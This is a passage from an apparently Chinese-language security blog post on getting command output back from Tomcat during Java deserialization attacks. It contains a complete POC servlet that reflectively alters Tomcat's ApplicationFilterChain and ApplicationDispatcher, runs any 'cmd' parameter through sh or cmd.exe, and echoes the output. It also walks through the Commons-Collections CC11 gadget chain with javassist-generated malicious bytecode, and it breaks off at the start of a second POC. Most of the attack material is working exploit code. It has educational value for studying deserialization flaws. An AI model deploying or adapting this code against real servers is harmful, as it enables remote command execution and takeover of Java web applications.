class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">                WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="literal">true</span>);<span class="comment">//由于private，设置为可修改</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">f0</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.reflect.Field&quot;</span>).getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">                f0.setAccessible(<span class="literal">true</span>);<span class="comment">//获取modifiers进行去除final修饰符</span></span><br><span class="line">                f0.setInt(WRAP_SAME_OBJECT_FIELD,WRAP_SAME_OBJECT_FIELD.getModifiers()&amp; ~Modifier.FINAL);</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>如果使用了final修饰，而没有使用static修饰，可以调用setAccessible(true)获得修改权限，或者修改Modifier，去除final修饰符；<br>如果同时使用了static和final，则只能通过修改Modifier去除final修饰符来获取修改权限；</p></blockquote><p>去除final修饰符</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WRAP_SAME_OBJECT_FIELD.getModifiers()&amp; ~Modifier.FINAL</span><br></pre></td></tr></table></figure><p>lastServicedRequest&#x2F;lastServicedResponse也需要去除final才能进行修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">applicationFilterChain</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> applicationFilterChain.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> applicationFilterChain.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line">            lastServicedRequestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedResponseField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            f0.setInt(lastServicedRequestField,lastServicedRequestField.getModifiers()&amp; ~Modifier.FINAL);</span><br><span class="line">            f0.setInt(lastServicedResponseField,lastServicedResponseField.getModifiers()&amp; ~Modifier.FINAL);</span><br></pre></td></tr></table></figure><ul><li>将WRAP_SAME_OBJECT_FIELD设置为true，并传入初始ThreadLocal进行初始化</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WRAP_SAME_OBJECT_FIELD.setBoolean(applicationDispatcher,<span class="literal">true</span>);</span><br><span class="line">lastServicedRequestField.set(applicationFilterChain,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">lastServicedResponseField.set(applicationFilterChain,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br></pre></td></tr></table></figure><p>POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Echo.java</span></span><br><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.ResponseFacade;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Writer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/echo&quot;)</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Echo</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">applicationDispatcher</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> applicationDispatcher.getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// 利用反射修改 final 变量 ，不这么设置无法修改 final 的属性</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">f0</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.reflect.Field&quot;</span>).getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">            f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            f0.setInt(WRAP_SAME_OBJECT_FIELD,WRAP_SAME_OBJECT_FIELD.getModifiers()&amp; ~Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">            <span class="type">Class</span> <span class="variable">applicationFilterChain</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> applicationFilterChain.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> applicationFilterChain.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line">            lastServicedRequestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedResponseField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            f0.setInt(lastServicedRequestField,lastServicedRequestField.getModifiers()&amp; ~Modifier.FINAL);</span><br><span class="line">            f0.setInt(lastServicedResponseField,lastServicedResponseField.getModifiers()&amp; ~Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">            ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(applicationFilterChain);</span><br><span class="line">            ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(applicationFilterChain);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> lastServicedRequest!=<span class="literal">null</span> ? lastServicedRequest.get().getParameter(<span class="string">&quot;cmd&quot;</span>):<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(applicationDispatcher) || lastServicedRequest == <span class="literal">null</span> || lastServicedResponse == <span class="literal">null</span>)&#123;</span><br><span class="line">                WRAP_SAME_OBJECT_FIELD.setBoolean(applicationDispatcher,<span class="literal">true</span>);</span><br><span class="line">                lastServicedRequestField.set(applicationFilterChain,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">                lastServicedResponseField.set(applicationFilterChain,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd!=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="type">Writer</span> <span class="variable">writer</span> <span class="operator">=</span> lastServicedResponse.get().getWriter();</span><br><span class="line">                writer.write(output);</span><br><span class="line">                writer.flush();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用lastServicedRequest.get()获取request请求，将结果写入lastServicedResponse进行回显</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102133628109.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102133628109.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230102133628109"></p><h2 id="CC注入Tomcat"><a href="#CC注入Tomcat" class="headerlink" title="CC注入Tomcat"></a>CC注入Tomcat</h2><p>上面的测试是事先服务器就写好了POC也就是Echo类。但通常漏洞入口点是反序列化，而不能直接写文件</p><p>根据目标服务器的CC版本，可以使用不同的反序列化链进行注入。而注入字节码一般是最通用的。</p><p>用到字节码的CC链，CC11的限制很少。</p><p>版本限制：CommonsCollections3.1-3.2.1  JDK无版本限制</p><h3 id="cc11（可跳过直接用POC）"><a href="#cc11（可跳过直接用POC）" class="headerlink" title="cc11（可跳过直接用POC）"></a>cc11（可跳过直接用POC）</h3><p>利用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">java.io.objectInputstream.readObject() -&gt;</span><br><span class="line">java.util.Hashset.readobject() -&gt;</span><br><span class="line">java.util.HashMap.put() -&gt;</span><br><span class="line">java.util.HashMap.hash() -&gt;</span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.hashcode() -&gt;</span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.getvalue() -&gt;</span><br><span class="line">org.apache.commons.collections.map.LazyMap.get() -&gt;</span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform() -&gt;</span><br><span class="line">java.lang.reflect.Method.invoke()</span><br><span class="line">... templates gadgets ...</span><br><span class="line">java.lang.Runtime.exec()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>该链最后通过InvokerTransformer调用newTransformer加载恶意字节码。最开始初始化随便传入一个方法，最后通过Field#set修改transform为newTransform。这是为了避免在反序列化过程中其他地方提前触发了链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;asdfasdfasdf&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>利用javasist动态生成恶意字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 利用javasist动态创建恶意字节码</span></span><br><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line"><span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">cc.setName(randomClassName);</span><br><span class="line">cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); <span class="comment">//设置父类为AbstractTranslet，避免报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 写入.class 文件</span></span><br><span class="line"><span class="comment">// 将我的恶意类转成字节码，并且反射设置 bytecodes</span></span><br><span class="line"><span class="type">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line"><span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">f0</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f0.set(templates,targetByteCodes);</span><br><span class="line"></span><br><span class="line">f0 = templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f0.set(templates,<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">f0 = templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f0.set(templates,<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">java.util.HashMap.put() -&gt;</span><br><span class="line">java.util.HashMap.hash() -&gt;</span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.hashcode() -&gt;</span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.getvalue() -&gt;</span><br><span class="line">org.apache.commons.collections.map.LazyMap.get() -&gt;</span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform() -&gt;</span><br><span class="line">java.lang.reflect.Method.invoke()</span><br></pre></td></tr></table></figure><p>都是CC6的内容。实例化TiedMapEntry并将生成的恶意字节码传入，得到tiedmap恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">map</span> <span class="operator">=</span> (LazyMap)LazyMap.decorate(innermap,transformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,templates); </span><br></pre></td></tr></table></figure><p>HashMap#put如下:</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102145605133.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102145605133.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230102145605133"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102145636276.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102145636276.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230102145636276"></p><p>如果key可控，就会调用key.hashCode()</p><p>在HashSet#readObject中，e是s的反序列化，调用了map.put</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102145837203.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102145837203.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230102145837203"></p><p>这里的s就是通过序列化ObjectOutputStream得到的</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102150042436.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102150042436.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230102150042436"></p><p>所以构造恶意key进行反序列化</p><p>先利用HashSet构造函数获取初始map</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102151016347.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102151016347.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230102151016347"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HashSet</span> <span class="variable">hashset</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashset.add(<span class="string">&quot;foo&quot;</span>);</span><br></pre></td></tr></table></figure><p>利用初始hashset反射获取map：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashset_map</span> <span class="operator">=</span> (HashMap) f.get(hashset);</span><br></pre></td></tr></table></figure><p>map不能用的时候用table，放入tiedmap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">    f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Object[] array = (Object[])f2.get(hashset_map);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span>(node == <span class="literal">null</span>)&#123;</span><br><span class="line">    node = array[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Field</span> <span class="variable">keyField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">    keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">keyField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">keyField.set(node,tiedmap);</span><br></pre></td></tr></table></figure><p>最后将transform的iMethodName修改为TemplatesImpl入口newtransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">f3</span> <span class="operator">=</span> transformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">f3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f3.set(transformer,<span class="string">&quot;newTransformer&quot;</span>);</span><br></pre></td></tr></table></figure><p>POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"><span 